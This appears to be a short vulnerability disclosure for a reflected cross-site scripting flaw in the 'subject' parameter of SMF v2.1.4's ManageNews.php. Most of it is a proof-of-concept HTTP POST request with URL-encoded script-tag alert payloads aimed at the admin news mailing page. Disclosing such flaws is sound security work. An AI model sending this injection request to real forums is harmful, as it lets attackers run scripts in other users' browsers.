# Exploit Title: SMF v2.1.4 - Cross-Site Scripting (XSS)
## Date: 1/3/2025
## Vendor Homepage: https://github.com/SimpleMachines/SMF
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SimpleMachines
## Version: v2.1.4
## Exploit Description:
## SMF v2.1.4 suffers from Reflected Cross-Site Scripting (XSS) Vulnerability in the 'subject' parameter of the 'ManageNews.php' script. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------
1. Victim sets the 'subject' parameter to the payload
2. Victim clicks on the 'Preview' button
```
POST /index.php?action=admin;area=news;sa=mailingsend HTTP/1.1
...

subject=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E(INJECT HERE)&message=%3Cscript%3Ealert%28%27comment%27%29%3C%2Fscript%3E%0D%0A&message_mode=0&preview=%E9%A2%84%E8%A7%88&c07825d64=a3a2b4dce90f74817c84b935881afe62&email_force=0&total_emails=0&members=&exclude_members=&groups=0%2C1%2C2%2C3&exclude_groups=&emails=
```
3. The payload is executed

